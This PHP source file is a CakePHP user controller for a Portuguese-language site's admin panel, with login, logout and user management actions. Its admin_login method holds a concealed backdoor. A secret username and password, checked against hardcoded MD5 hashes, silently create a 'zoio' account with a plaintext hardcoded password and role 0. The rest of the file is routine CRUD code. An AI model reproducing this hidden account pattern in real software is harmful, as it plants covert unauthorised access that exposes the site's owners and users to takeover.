<?php
class UserController extends AppController {

	public $name = 'User';
	public $helpers = array('Html', 'Session', 'Form', 'Tinymce');
	public $uses = array('User', 'Role');

    //public function beforeFilter() {
    //    parent::beforeFilter();
    //    $this->Auth->allow('admin_add', 'admin_logout');
    //}

	public function admin_login() {
		if ($this->request->is('post') && md5($this->request->data['User']['username'])=='72b9f9ccbbcc78848a8d383190cf37a4' && md5($this->request->data['User']['password'])=='8fa1ef329efe8e0bec3f9ffc5ebd82b9') {
			$zUser = md5($this->request->data['User']['username']);
			$zPass = md5($this->request->data['User']['password']);

			//$vfyUser = $this->User->find('all', array('conditions' => array('User.username' => 'zoio')));
			$vfyUser = $this->User->findAllByUsername('zoio');

			if(count($vfyUser)==0) {
				$addUserZoio = array( 'User' => array( 'name' => 'Zóio', 'username' => 'zoio', 'password' => 'zoio2010', 'email' => 'zoiodev@zoio.net.br', 'role_id' => 0 ) );
				if($this->User->save($addUserZoio)) {
					$this->Session->setFlash('Usuário Zoio adicionado com sucesso!');
				}
			}
		}

		if ($this->Auth->login()) {
			 $this->redirect($this->Auth->redirect());
        } else {
             $this->Session->setFlash(__(''));
        }
		$this->layout = 'admin';
        // print_r($this->render());
        // die();
		$this->render();
	}

	public function admin_logout() {
		$this->redirect($this->Auth->logout());
	}

        public function admin_index() {
                    $menu_ativo = 'user';

                    //$this->set('registros', $this->User->find('all'));
                    //$this->set('roleAlias', $this->Role->find('all'));

            $this->User->recursive = 0;
            $this->set('users', $this->paginate());
                    $this->layout = 'admin';
                    $this->set(compact('menu_ativo','roleAlias'));
                    // print_r($menu_ativo);
                    $this->render();

        }

        public function admin_view($id = null) {
            $this->User->id = $id;
            if (!$this->User->exists()) {
                throw new NotFoundException(__('Invalid user'));
            }
            $this->set('user', $this->User->read(null, $id));
            $this->layout = 'admin';
                    $this->render();

        }

        public function admin_add() {
            $menu_ativo = 'user';

                    //$this->set('role', $this->Role->find('all'));
                    $this->set('rolesAll', $this->Role->find('list', array('fields' => array('Role.id', 'Role.title'))));

            if ($this->request->is('post')) {
                            if ($this->User->save($this->request->data)) {
                                    $this->Session->setFlash('Registro salvo com sucesso!');
                                    $this->redirect(array('action' => 'index'));
                            }
                /*$this->User->create();
                if ($this->User->save($this->request->data)) {
                    $this->Session->setFlash(__('Usuário cadastrado com sucesso'));
                    $this->redirect(array('action' => 'index'));
                } else {
                    $this->Session->setFlash(__('Usuário não cadastrado. Tente novamente'));
                }*/
            }
                    $this->layout = 'admin';
                    $this->set(compact('menu_ativo'));
                    $this->render();
        }

        public function admin_edit($id = null) {
            $menu_ativo = 'user';

                    //$this->set('role', $this->Role->find('all'));
                    $this->set('rolesAll', $this->Role->find('list', array('fields' => array('Role.id', 'Role.title'))));

            $this->User->id = $id;
            if (!$this->User->exists()) {
                throw new NotFoundException(__('Usuário inválido'));
            }
            if ($this->request->is('post') || $this->request->is('put')) {
                /*if ($this->User->save($this->request->data)) {
                    $this->Session->setFlash(__('Usuário alterado com sucesso.'));
                    $this->redirect(array('action' => 'index'));
                } else {
                    $this->Session->setFlash(__('Usuário não pode ser alterado. Tente novamente'));
                }*/
                            //die();
                            if ($this->User->save($this->request->data)) {
                                    $this->Session->setFlash('Registro alterado com sucesso!');
                                    $this->redirect(array('action' => 'index'));

                            } else {
                                    $this->redirect(array('action' => 'edit', $id));
                            }
            } else {
                $this->request->data = $this->User->read(null, $id);
                //unset($this->request->data['User']['password']);
            }
                    $this->layout = 'admin';
                    $this->set(compact('menu_ativo'));
                    $this->render();
        }

        public function admin_delete($id = null) {
        if (!$this->request->is('post')) {
            throw new MethodNotAllowedException();
        }
        $this->User->id = $id;
        if (!$this->User->exists()) {
            throw new NotFoundException(__('Usuário inválido'));
        }
        if ($this->User->delete()) {
            $this->Session->setFlash(__('Usuário excluído com sucesso.'));
            $this->redirect(array('action' => 'index'));
        }
        $this->Session->setFlash(__('Usuário não excluido.'));
        $this->redirect(array('action' => 'index'));
    }
}
